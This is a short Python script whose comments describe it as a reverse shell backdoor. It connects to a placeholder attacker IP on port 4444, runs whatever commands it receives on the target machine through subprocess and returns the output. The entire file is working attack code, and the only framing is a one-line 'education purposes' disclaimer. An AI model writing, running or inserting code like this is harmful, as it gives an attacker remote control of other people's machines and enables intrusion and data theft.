
# This script is a simple reverse shell backdoor that connects to an attacker's IP and listens for commands.
# The attacker can execute commands on the target machine and receive the output.
# The backdoor can also change directories using the "cd" command
#TODO this script is only for education purposes, do not use it for malicious purposes i'm not responsible for any damage caused by this script

import socket
import subprocess
import os

IP = "ATTACKER_IP"  # Replace with your attacker's IP
PORT = 4444          # Replace with your desired port

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))

    while True:
        command = s.recv(1024).decode()

        if command.lower() == "exit":
            break
        elif command[:2].lower() == "cd":
            try:
                os.chdir(command[3:])
                s.send(f"Changed directory to {os.getcwd()}\n".encode())
            except FileNotFoundError as e:
                s.send(f"Directory not found: {str(e)}\n".encode())
        else:
            try:
                output = subprocess.getoutput(command)
                s.send(output.encode())
            except Exception as e:
                s.send(f"Error executing command: {str(e)}\n".encode())

    s.close()

connect()
